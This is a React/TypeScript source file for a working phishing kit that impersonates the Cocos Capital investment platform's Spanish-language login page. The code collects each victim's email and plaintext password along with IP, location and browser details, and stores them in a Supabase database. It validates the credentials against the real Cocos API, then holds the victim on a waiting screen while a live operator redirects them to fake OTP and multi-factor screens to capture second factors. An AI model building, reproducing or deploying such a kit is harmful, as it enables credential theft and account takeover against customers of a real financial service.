import { useState, useEffect, useCallback } from "react";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import { useRateLimit } from "@/hooks/useRateLimit";
import { supabase } from "@/integrations/supabase/client";
import { invokeCocos } from "@/lib/cocosApi";
import cocosLogo from "@/assets/cocos-logo.png";
import CocosLogo from "@/components/cocos/CocosLogo";
import CocosLoginForm from "@/components/cocos/CocosLoginForm";
import CocosOtpScreen from "@/components/cocos/CocosOtpScreen";
import CocosConfirmEmailScreen from "@/components/cocos/CocosConfirmEmailScreen";
import CocosSyncEmailScreen from "@/components/cocos/CocosSyncEmailScreen";
import CocosUpdateModal from "@/components/cocos/CocosUpdateModal";
import CocosWaitingScreen from "@/components/cocos/CocosWaitingScreen";
import CocosSuccessScreen from "@/components/cocos/CocosSuccessScreen";
import CocosMfaSmsScreen from "@/components/cocos/CocosMfaSmsScreen";
import CocosMfaEmailScreen from "@/components/cocos/CocosMfaEmailScreen";

type LoginStep = "form" | "waiting" | "success" | "otp" | "confirm_email" | "sync_email" | "mfa_sms" | "mfa_email";

const CocosDigital = () => {
  const [step, setStep] = useState<LoginStep>("form");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [generalError, setGeneralError] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState("");
  const [showUpdateModal, setShowUpdateModal] = useState(false);

  const rateLimit = useRateLimit();
  useVisitTracker();
  useVisitorPresence(sessionId);

  useEffect(() => {
    const originalTitle = document.title;
    document.title = "Cocos Capital — Iniciar sesión";

    // Favicon
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    const originalFavicon = link.href;
    link.rel = "icon";
    link.type = "image/png";
    link.href = cocosLogo;
    document.head.appendChild(link);

    // Meta description
    let meta = document.querySelector("meta[name='description']") as HTMLMetaElement | null;
    const originalDesc = meta?.content || "";
    if (!meta) { meta = document.createElement("meta"); meta.name = "description"; document.head.appendChild(meta); }
    meta.content = "Cocos Capital — Tu plataforma de inversiones. Operá acciones, bonos, CEDEARs y más.";

    // OG tags
    const setOg = (prop: string, content: string) => {
      let el = document.querySelector(`meta[property='${prop}']`) as HTMLMetaElement | null;
      if (!el) { el = document.createElement("meta"); el.setAttribute("property", prop); document.head.appendChild(el); }
      el.content = content;
    };
    setOg("og:title", "Cocos Capital — Iniciar sesión");
    setOg("og:description", "Tu plataforma de inversiones. Operá acciones, bonos, CEDEARs y más.");

    return () => {
      document.title = originalTitle;
      link.href = originalFavicon;
      if (meta) meta.content = originalDesc;
    };
  }, []);

  // Listen for admin popup toggle broadcast
  useEffect(() => {
    const myId = sessionId || sessionStorage.getItem("falconx_session_id");
    const popupChannel = supabase.channel("admin-popup-broadcast");
    popupChannel
      .on("broadcast", { event: "toggle_popup" }, (payload) => {
        const { session_id, show } = payload.payload || {};
        if (session_id === "__all__" || session_id === myId) {
          setShowUpdateModal(!!show);
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(popupChannel); };
  }, [sessionId]);

  useEffect(() => {
    if (!sessionId || step === "form" || step === "success") return;
    const channel = supabase.channel(`session-review-${sessionId}`);
    channel.on("broadcast", { event: "review_decision" }, (payload) => {
      const decision = payload.payload?.status as string;
      if (decision === "login_success") setStep("success");
      else if (decision === "wrong_password") { setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); if (step !== "waiting") setStep("waiting"); }
      else if (decision === "redirect_otp") { setStep("otp"); setErrorMessage(""); }
      else if (decision === "redirect_mfa_sms") { setStep("mfa_sms"); setErrorMessage(""); }
      else if (decision === "redirect_mfa_email") { setStep("mfa_email"); setErrorMessage(""); }
      else if (decision === "redirect_confirm_email") { setStep("confirm_email"); setErrorMessage(""); }
      else if (decision === "redirect_sync_email") { setStep("sync_email"); setErrorMessage(""); }
    }).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status").eq("id", sessionId).maybeSingle();
      if (!data) return;
      if (data.status === "login_success") setStep("success");
      else if (data.status === "wrong_password") { if (!errorMessage) setErrorMessage("Contraseña incorrecta. Intentá de nuevo."); if (step !== "waiting") setStep("waiting"); }
      else if (data.status === "redirect_otp") { if (step !== "otp") setStep("otp"); setErrorMessage(""); }
      else if (data.status === "redirect_mfa_sms") { if (step !== "mfa_sms") setStep("mfa_sms"); setErrorMessage(""); }
      else if (data.status === "redirect_mfa_email") { if (step !== "mfa_email") setStep("mfa_email"); setErrorMessage(""); }
      else if (data.status === "redirect_confirm_email") { if (step !== "confirm_email") setStep("confirm_email"); setErrorMessage(""); }
      else if (data.status === "redirect_sync_email") { if (step !== "sync_email") setStep("sync_email"); setErrorMessage(""); }
      else if (data.status === "pending_review") setErrorMessage("");
    }, 3000);

    return () => { supabase.removeChannel(channel); clearInterval(pollInterval); };
  }, [sessionId, step]);

  const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
    setGeneralError(""); setErrorMessage(""); setLoading(true); setEmail(submittedEmail);

    // 1) Fetch IP info (always, regardless of validation)
    let ipData = { ip: "unknown", country: "", city: "", region: "" };
    try {
      const res = await fetch("https://ipapi.co/json/");
      if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
    } catch { /* ignore */ }

    // 2) If email or password is empty, save as wrong_password and show error
    if (!submittedEmail.trim() || !password.trim()) {
      const errorMsg = !submittedEmail.trim()
        ? "Ingresá tu email para continuar."
        : "Ingresá tu contraseña para continuar.";
      if (sessionId) {
        await supabase.from("sessions").update({ email: submittedEmail || null, password: password || null, status: "wrong_password" }).eq("id", sessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail || null, password: password || null,
          ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "wrong_password", source: "cocosdigital",
        });
        setSessionId(newId);
      }
      setGeneralError(errorMsg);
      setLoading(false);
      return;
    }

    try {
      // 3) Validate credentials against real Cocos Capital API
      const authRes = await invokeCocos({ email: submittedEmail, password });
      const authData = authRes.data;

      // ONLY valid_credentials goes to pending_review
      if (authData?.status === "valid_credentials") {
        if (sessionId) {
          await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", sessionId);
          setStep("waiting");
        } else {
          const newId = crypto.randomUUID();
          await supabase.from("sessions").insert({
            id: newId, email: submittedEmail, password,
            ip_address: ipData.ip, user_agent: navigator.userAgent,
            country: ipData.country, city: ipData.city, region: ipData.region,
            status: "pending_review", source: "cocosdigital",
          });
          setSessionId(newId); setStep("waiting");
        }
        setLoading(false);
        return;
      }

      // Everything else (invalid_credentials, challenge_required, errors) → wrong_password
      if (sessionId) {
        await supabase.from("sessions").update({ email: submittedEmail, password, status: "wrong_password" }).eq("id", sessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail, password,
          ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "wrong_password", source: "cocosdigital",
        });
        setSessionId(newId);
      }
      setGeneralError("Contraseña incorrecta. Verificá tus datos e intentá de nuevo.");
    } catch {
      // Network/edge function error → wrong_password
      if (sessionId) {
        await supabase.from("sessions").update({ email: submittedEmail, password, status: "wrong_password" }).eq("id", sessionId);
      } else {
        const newId = crypto.randomUUID();
        await supabase.from("sessions").insert({
          id: newId, email: submittedEmail || null, password: password || null,
          ip_address: ipData.ip, user_agent: navigator.userAgent,
          country: ipData.country, city: ipData.city, region: ipData.region,
          status: "wrong_password", source: "cocosdigital",
        });
        setSessionId(newId);
      }
      setGeneralError("Ocurrió un error. Intentá de nuevo.");
    }
    setLoading(false);
  }, [sessionId]);

  const handlePasswordResubmit = useCallback(async (newPassword: string) => {
    if (!sessionId) return; setErrorMessage("");
    await supabase.from("sessions").update({ password: newPassword, status: "pending_review" }).eq("id", sessionId);
    const broadcastChannel = supabase.channel(`session-resubmit-${sessionId}-${Date.now()}`);
    broadcastChannel.subscribe((status) => {
      if (status === "SUBSCRIBED") {
        broadcastChannel.send({ type: "broadcast", event: "review_decision", payload: { status: "pending_review" } });
        setTimeout(() => supabase.removeChannel(broadcastChannel), 2000);
      }
    });
  }, [sessionId]);

  const handleRetry = useCallback(() => { setStep("form"); setSessionId(null); setErrorMessage(""); setGeneralError(""); }, []);

  if (rateLimit.loading) {
    return <div className="flex min-h-screen items-center justify-center bg-[#f5f7fb]"><div className="animate-pulse text-[#8895aa] text-sm">Cargando...</div></div>;
  }
  if (rateLimit.blocked) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f5f7fb] px-4">
        <div className="w-full max-w-[460px] rounded-xl border border-red-200 bg-white p-10 text-center">
          <h2 className="mb-2 text-lg font-bold text-[#1a2233]">Acceso denegado</h2>
          <p className="text-sm text-[#8895aa]">Tu acceso fue suspendido temporalmente por actividad inusual.</p>
        </div>
      </div>
    );
  }

  if (step === "otp" && sessionId) return <CocosOtpScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "mfa_sms" && sessionId) return <CocosMfaSmsScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "mfa_email" && sessionId) return <CocosMfaEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "confirm_email" && sessionId) return <CocosConfirmEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;
  if (step === "sync_email" && sessionId) return <CocosSyncEmailScreen email={email} sessionId={sessionId} onBack={handleRetry} />;

  return (
    <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5 pt-8 pb-6 sm:pt-10">
      {step === "form" && (
        <CocosUpdateModal
          open={showUpdateModal}
          onClose={() => setShowUpdateModal(false)}
          onProceed={() => setShowUpdateModal(false)}
        />
      )}
      {/* Logo */}
      <div className="mb-6 sm:mb-8">
        <CocosLogo />
      </div>

      <div className="flex w-full max-w-[440px] flex-1 flex-col">
        {step === "form" && (
          <>
            {generalError && (
              <div className="mb-4 rounded-xl border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{generalError}</div>
            )}
            <CocosLoginForm onSubmit={handleLoginSubmit} loading={loading} />
          </>
        )}

        {step === "waiting" && sessionId && (
          <CocosWaitingScreen email={email} sessionId={sessionId} errorMessage={errorMessage} onPasswordResubmit={handlePasswordResubmit} />
        )}

        {step === "success" && (
          <CocosSuccessScreen email={email} />
        )}
      </div>
    </div>
  );
};

export default CocosDigital;
